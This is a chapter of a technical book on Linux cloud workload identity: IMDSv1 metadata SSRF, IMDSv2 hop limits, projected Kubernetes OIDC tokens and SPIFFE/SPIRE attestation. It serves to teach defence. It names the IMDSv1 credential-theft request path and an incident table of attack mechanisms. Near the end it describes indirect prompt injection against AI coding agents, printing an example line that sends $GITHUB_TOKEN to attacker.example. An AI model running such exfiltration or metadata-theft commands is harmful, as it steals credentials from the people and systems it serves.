# Cloud Workload Identity: OIDC Projections, IMDSv2, and SPIFFE/SPIRE

## Overview

* **Link in the Chain:** Authenticates Linux containers and micro-VMs ([Chapters 14](14-containers-escapes.md) and [15](15-gvisor-microvms.md)) to cloud control planes, object stores, and peer microservices without static credentials, rooting ephemeral `X.509`/`JWT` identities in `TPM 2.0` / cloud node attestation and Linux kernel `SO_PEERCRED`/`cgroup` inspection.
* **Core Security Invariant:** Workloads never hold long-lived static API secrets (`AWS_SECRET_ACCESS_KEY`) or inherit broad worker-node `IMDSv1` roles; instead, host metadata enforces `IMDSv2` stateful `PUT` tokens with `IP TTL = 1` hop limits, Kubernetes projects short-lived audience-bound OIDC `TokenRequest` JWTs per pod, and `SPIRE` issues auto-rotated `X.509-SVID` mTLS certificates only after verifying node hardware/IID provenance and caller `SO_PEERCRED`/`pidfd` + `cgroups v2` selectors.
* **Deployment Profile Matrix:** Legacy cloud VMs rely on unhardened instance-wide IAM roles (`169.254.169.254`); modern cloud Kubernetes (`EKS` Pod Identity/IRSA, `GKE` Workload Identity, `AKS` Workload Identity) enforces `HttpTokens=required` + `HttpPutResponseHopLimit=1` on `IMDSv2` and projects bound OIDC JWTs; hybrid bare-metal + multi-cloud meshes standardize on `CNCF SPIFFE` / `SPIRE` (`Istio`, `Cilium`, `Envoy`).
* **Trusted Computing Base (TCB):** Cloud hypervisor metadata endpoint (`169.254.169.254`), Linux network stack (`TTL` enforcement and `nftables`/CNI egress filters), Kubernetes `API Server` OIDC signer + `kubelet` volume projector, and `SPIRE` Server + local `SPIRE` Agent (`SO_PEERCRED`/`pidfd` + `TPM 2.0` / IID node attesters).
* **Integration Seam & Handoff:** Eliminates static cloud credential sprawl and `169.254.169.254` SSRF node-role theft; hands off specialized confinement and host-side credential brokering for prompt-injected AI agents to [Chapter 17](17-ai-agent-sandboxes.md).

## Problem Statement & Threat Model

How does a Linux process running on a cloud VM or Kubernetes node prove its identity to an external database, secret vault, or S3 bucket? Historically, engineering teams fell into two disastrous anti-patterns [128, 129, 130, 133]. Anti-pattern one (*static secret sprawl*) minted non-expiring `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` strings or static client certificates and injected them into `.env` files, CI variables, and Kubernetes `Secret` objects: guaranteeing eventual leakage through Git commits, debug logs, `etcd` backups, or compromised developer laptops.

Anti-pattern two (*ambient link-local metadata*) replaced static keys with cloud Instance Metadata Services (`IMDSv1`) listening on the unauthenticated IPv4 link-local address `http://169.254.169.254/` [129, 130]. Any process on the Linux VM: *and, via Linux IP forwarding across `veth` container bridges, every single container pod scheduled on that worker node*: could send a stateless, headerless `HTTP GET http://169.254.169.254/latest/meta-data/iam/security-credentials/<node-role>` and receive valid temporary STS credentials for the entire VM! As the 2019 Capital One breach and hundreds of cloud compromises proved [130], any trivial Server-Side Request Forgery (`SSRF`) bug in a web app, misconfigured `nginx` reverse proxy, XML external entity (`XXE`) parser, or PDF renderer running inside an unprivileged container immediately stole the worker node's broad IAM role (`ec2:*`, `s3:*`, `ecr:*`) without needing any container escape or Linux kernel exploit!

Even within Kubernetes itself, early `ServiceAccount` tokens (`v1.0` through `v1.20`) were static, non-expiring JWTs stored as persistent Secrets in `etcd` with zero audience restriction (`aud` missing) and zero pod-instance binding [128]. Under an adversary model encompassing application-layer `SSRF`, compromised single-tenant pods attempting lateral movement across a worker node, and hybrid fleets spanning bare-metal Linux data centers alongside AWS/GCP/Azure, modern Linux workload identity must solve what `SPIFFE` authors call the "Bottom Turtle" problem [133]: *how to bootstrap short-lived, least-privilege cryptographic workload credentials from zero pre-shared application secrets by chaining hardware/hypervisor node attestation directly into Linux kernel process/cgroup attestation* [128, 131, 132].

## Kernel & Userspace Mechanics

### Defeating Metadata SSRF: `IMDSv2` Session Tokens and `IP TTL = 1` Hop Limits

Engineered by AWS after analyzing real-world SSRF and open-proxy exploit mechanics [129, 130] (with analogous header protections `Metadata-Flavor: Google` on GCP and `Metadata: true` on Azure), Instance Metadata Service Version 2 (`IMDSv2`) closes `169.254.169.254` ambient theft across both the HTTP protocol layer and the Linux IP network layer:

![Figure: Why stateless IMDSv1 HTTP GET requests fall to web SSRF and routed container packets, and how IMDSv2 (PUT session preflight + IP TTL = 1 hop limit) paired with Kubernetes projected OIDC tokens isolates cloud credentials.](diagrams/16-imdsv1-ssrf-vs-imdsv2.svg)

First, at Layer 7 (Stateful `PUT` Preflight), disabling `IMDSv1` (`HttpTokens = required`) causes `169.254.169.254` to reject every plain `GET` request with `401 Unauthorized` [129]. Before reading metadata, the client must first issue an `HTTP PUT` request to `/latest/api/token` carrying a custom header `X-aws-ec2-metadata-token-ttl-seconds: 21600` (and *no* `X-Forwarded-For` header: `IMDSv2` explicitly rejects `PUT` requests bearing `X-Forwarded-For` so misconfigured reverse proxies immediately fail!), receive a random session token, and echo that token inside `X-aws-ec2-metadata-token` on subsequent `GET` calls [129, 130]. Classic URL-parameter SSRF vulnerabilities (`?avatar_url=http://169.254.169.254/...`), image fetchers, and `302` open redirects can issue `GET` requests, *not* two-step stateful `PUT`-then-custom-header-`GET` sequences!

Second, and brilliantly Linux-specific, at Layer 3 (`IP TTL = 1` Hop Limit) [129]: what if an attacker has full code execution (`curl -X PUT ...`) inside an unprivileged Kubernetes pod on the EC2 worker node? On Linux, a container running inside its own network namespace (`CLONE_NEWNET` [Chapter 14](14-containers-escapes.md)) reaches `169.254.169.254` by sending packets over its virtual Ethernet (`veth`) pair to the host network namespace, which routes (`ip_forward = 1`) the packet out toward the hypervisor link-local interface! Under Linux IPv4 forwarding rules (`net/ipv4/ip_forward.c`), every routed hop decrements the IP header's 8-bit Time-To-Live (`ip_hdr(skb)->ttl`) by `1`! When `IMDSv2` is configured with `HttpPutResponseHopLimit = 1` (the hardened default for container hosts [129]), the hypervisor stamps `IP TTL = 1` onto the `PUT` token response packet: when that response hits the host Linux kernel to be forwarded across the `veth` bridge into the container's `net_ns`, Linux decrements `TTL` from `1` to `0` and drops the packet (`ICMP Time Exceeded`) in Ring 0 before the container ever sees a single byte of the token! Host-namespace daemons (`kubelet`, `ssm-agent`) still receive `TTL = 1` locally (`LOCAL_IN`), while pods are physically cut off at Layer 3: reinforced by CNI `NetworkPolicy` or `nftables` (`ip daddr 169.254.169.254 drop`) blocking `169.254.0.0/16` from pod subnets altogether!

### Bound Projected Kubernetes OIDC JWTs (`TokenRequest` Federation)

Once pods are blocked from touching the worker node's `IMDS` role, how does `payments-api` Pod A get `s3:GetObject` on `s3://payments-prod/*` while `search-worker` Pod B on the *exact same Linux worker node* gets zero S3 permissions? Through Kubernetes Bound ServiceAccount Token Projection (`TokenRequest` API, mandatory since Kubernetes `1.22+` [128]):

Instead of static `etcd` secrets, `kubelet` mounts an ephemeral memory-backed projected volume (`/var/run/secrets/kubernetes.io/serviceaccount/token` or custom audience projection) containing an asymmetric RS256/ES256 `JSON Web Token` (`JWT`) signed by the Kubernetes API Server's OIDC issuer key with three strict bindings [128]. First, every token enforces a short lifetime and automatic rotation (`expirationSeconds: 3600`), refreshed on `tmpfs` by `kubelet` at 80% lifetime (`48` minutes) and invalidated immediately by the API server the instant the `Pod` UID is deleted. Second, each token carries an explicit audience (`aud`) scoped to `sts.amazonaws.com` (or `sts.googleapis.com` / `api://AzureADTokenExchange`), so a token stolen from an HTTP log cannot be replayed against the Kubernetes API server itself. Third, the token embeds exact `kubernetes.io` pod and node instance claims (`namespace`, `serviceaccount.name`, `pod.name`, `pod.uid`, and `node.name`): when the pod calls `sts:AssumeRoleWithWebIdentity`, AWS/GCP/Azure IAM verifies the JWT signature against the cluster's OIDC `.well-known/openid-configuration` JWKS endpoint and evaluates IAM condition `"StringEquals": { "oidc.../sub": "system:serviceaccount:payments:payments-api" }`, minting least-privilege short-lived cloud credentials strictly for that single ServiceAccount [128].

### `SPIFFE` and `SPIRE`: Hardware-to-Workload mTLS Across Any Substrate

Cloud IAM OIDC federation authenticates pods to *cloud APIs*, yet microservices across Kubernetes clusters, bare-metal Linux databases, and `VM` fleets also need cryptographic service-to-service mutual TLS (`mTLS`) without managing internal PKI keyfiles or trusting IP addresses (`NetworkPolicy` IP spoofing / NAT loss). Standardized by CNCF, `SPIFFE` (*Secure Production Identity Framework for Everyone* [131]) assigns every workload a platform-agnostic URI identity: a `SPIFFE ID` such as `spiffe://prod.acme.internal/ns/payments/sa/ledger-api`: encoded as the `URI` Subject Alternative Name (`SAN`) inside a short-lived X.509 certificate (`X.509-SVID`, typically 1-hour TTL!) paired with a dynamic root CA `Trust Bundle` [131, 133].

![Figure: Zero-secret workload identity bootstrapping in CNCF SPIRE: combining hardware/cloud Node Attestation (TPM 2.0 DevID/Quote or Cloud IID) with Linux kernel Workload Attestation (SO_PEERCRED, pidfd, binary SHA-256, and cgroup v2 pod selectors) to stream short-lived X.509-SVIDs in RAM.](diagrams/16-spiffe-spire-attestation.svg)

How does `SPIRE` (the production `SPIFFE` Runtime Environment [132]) issue `spiffe://prod.acme.internal/ns/payments/sa/ledger-api` to a newly started Linux process with zero pre-shared secrets on disk? By chaining two independent attestation hops [132, 133]:

First, Node Attestation (Agent $\leftrightarrow$ Server): when a new Linux host boots, the local `spire-agent` daemon has no credentials. On bare metal, the `tpm_devid` (IEEE 802.1AR `IDevID` factory TPM certificate) or `Keylime`/`TPM 2.0` `TPM2_Quote` plugin ([Chapter 4](04-ima-ipe-keylime.md)) proves hardware identity and boot `PCR` integrity to `spire-server`; on AWS/GCP/Azure, `spire-agent` presents the hypervisor-signed Instance Identity Document (`aws_iid` RSA/PKCS#7 document, `gcp_iit` signed JWT, or `azure_msi`), which `spire-server` verifies against cloud root CAs *and* enforces *Trust-On-First-Attest* (`TOFA`, refusing duplicate node re-enrollment unless reset!). Only then does `spire-server` issue the node's own `Agent SVID` and stream down *only* the workload registration entries authorized to run on that specific node (so a compromised Worker Node A can *never* request an `SVID` for `vault-unsealer` scheduled exclusively on Node B!) [132].

Second, Kernel Workload Attestation (Workload $\leftrightarrow$ Local Agent) [131, 132]: inside the workload container, the application (or `Envoy`/`Cilium` sidecar) needs zero config keys; it simply opens the mounted read-only UNIX domain socket `/run/spire/sockets/agent.sock` and calls the gRPC `FetchX509SVID` Workload API (`SPIFFE` mandates *zero* client token on this call!). Instead of asking the workload who it is, `spire-agent` asks the host Linux kernel via `getsockopt(SO_PEERCRED)` and `SO_PEERPIDFD` ([Chapter 11](11-systemd-dbus-sandboxing.md))! Using that unforgeable kernel handle, `spire-agent`'s `unix` and `k8s` workload attesters inspect the caller's `UID`/`GID`, compute the `SHA-256` hash of `/proc/<pid>/exe` (verified cleanly if backed by `dm-verity`/`fs-verity` from [Chapter 3](03-luks2-verity.md)!), parse `/proc/<pid>/cgroup` (`cgroups v2` slice extracting the exact Kubernetes `Pod UID` and container ID), and cross-verify the `Pod UID` + image `SHA-256` digest against the local `kubelet` read-only API [132]! Matching all selectors (`k8s:ns:payments`, `k8s:sa:ledger-api`, `k8s:pod-image:sha256:...`, `unix:sha256:...`), `spire-agent` generates a fresh ECDSA P-256 keypair, obtains a 1-hour `X.509-SVID` signed by `spire-server`, streams it to the workload purely in RAM, and rotates it silently every 30 minutes [131, 132]!

## Distro, Immutable-OS, & Cloud Trade-Offs

Enforcing `IMDSv2` (`HttpTokens=required`, `HttpPutResponseHopLimit=1`), blocking `169.254.169.254` from pod networks, and migrating from static secrets to Kubernetes projected OIDC JWTs or `SPIRE` works identically across mutable and immutable Linux worker nodes (`Talos`, `Bottlerocket`, `Flatcar`, `EKS`/`GKE`/`AKS`) with negligible CPU cost [34, 128, 129]. The primary operational mistake in `SPIRE` Kubernetes deployments is mounting `/run/spire/sockets/agent.sock` carelessly or configuring overly broad selectors (`k8s:ns:default` without `sa` or image digest), or running untrusted pods with `hostPID: true` where `ptrace` could attach to a sibling process sharing the node unless `Yama` (`kernel.yama.ptrace_scope >= 1`), `SELinux`, and dropped `CAP_SYS_PTRACE` are active [132].

## Seam Failures, CVEs, & Structural Bounds

Workload identity failures exploit lingering `IMDSv1` endpoints, `HopLimit >= 2` misconfigurations on container nodes, audience-unbound JWTs, and PID-race bugs in older custom UNIX-socket workload attesters.

| Incident / CVE | Year | Subsystem | Broken Assumption | Exploit Mechanism | Architectural Fix |
|---|---|---|---|---|---|
| Cloud `IMDSv1` SSRF Breaches (Capital One class) | 2019-2024 | `169.254.169.254` `IMDSv1` + Web Proxy/App | Link-local `169.254.169.254` is reachable only by trusted host admins | Single `GET` SSRF or `mod_proxy` rule fetches worker-node IAM STS keys and exfiltrates S3 buckets | Mandate `IMDSv2` (`HttpTokens=required`, `HopLimit=1`) + drop pod egress to `169.254.169.254` [129, 130] |
| Container `IMDSv2` Bypass via `HopLimit = 2` | 2020-2025 | Cloud IaC (`Terraform` / `EKS` templates) | Raising `HttpPutResponseHopLimit = 2` safely fixes legacy AWS SDKs inside pods | `TTL = 2` survives `veth` routing (`2 - 1 = 1`), letting any RCE pod run `curl -X PUT` to steal node IAM role! | Keep `HopLimit = 1` strictly and migrate pods to projected OIDC Workload Identity (`IRSA` / Pod Identity) [128, 129] |
| Legacy Non-Bound K8s `ServiceAccount` Token Replay | 2018-2022 | Static `Secret`-mounted SA tokens | Stolen pod JWT expires when pod terminates | Non-expiring `etcd` JWT lacked `aud` and `expirationSeconds`, granting permanent API access off-cluster | Enforce bound `TokenRequest` projected volumes (`1h` TTL + explicit `aud`) [128] |
| Custom `SO_PEERCRED` PID-Reuse Attester Race | 2020-2023 | Naive workload attesters lacking `pidfd` | Reading `/proc/<ucred.pid>/cgroup` after `accept()` cannot race rapid exit | Short-lived child connects to socket and exits while attester inspects recycled numeric PID | Verify `SO_PEERPIDFD` / task `starttime` inside `SPIRE` (`v1.8+`) and run workloads in isolated PID namespaces [99, 132] |

Notice one radical case where even a 1-hour projected JWT or in-memory credential inside a container is still too dangerous: what if the workload *itself* is an autonomous AI coding agent or LLM code interpreter whose decisions are steered in real time by untrusted GitHub issues, web pages, or third-party `MCP` tools? If the agent holds *any* credential inside its sandbox, an Indirect Prompt Injection simply tells the agent `curl https://attacker.example -d "$GITHUB_TOKEN"`! Isolating AI agents and moving credentials *completely outside* the sandbox into a host-side proxy is the focus of [Chapter 17](17-ai-agent-sandboxes.md).

## Inspecting on a Live Linux Host

Test whether the current Linux cloud host exposes unauthenticated `IMDSv1` (`HTTP 200` is vulnerable; `HTTP 401` proves `IMDSv2` `HttpTokens=required` is enforced, or timeout on non-cloud/blocked hosts):

```bash
curl -s -o /dev/null -w "IMDSv1 HTTP status: %{http_code}\n" --connect-timeout 1 http://169.254.169.254/latest/meta-data/ 2>/dev/null || echo "169.254.169.254 unreachable / blocked"
```

Inspect a projected Kubernetes ServiceAccount JWT's header and claims (`aud`, `exp`, `kubernetes.io` pod binding) without exposing the signature, or check active `SPIRE` agent sockets:

```bash
ls -la /var/run/secrets/kubernetes.io/serviceaccount/token /run/spire/sockets/agent.sock 2>/dev/null || true
```

Verify host `nftables` / `iptables` rules blocking forwarded container traffic (`FORWARD` chain) to `169.254.169.254`:

```bash
# Viewing netfilter rulesets requires CAP_NET_ADMIN (root / run0)
nft list ruleset 2>/dev/null | grep -C 2 "169.254.169.254" || iptables -S FORWARD 2>/dev/null | grep "169.254" || true
```
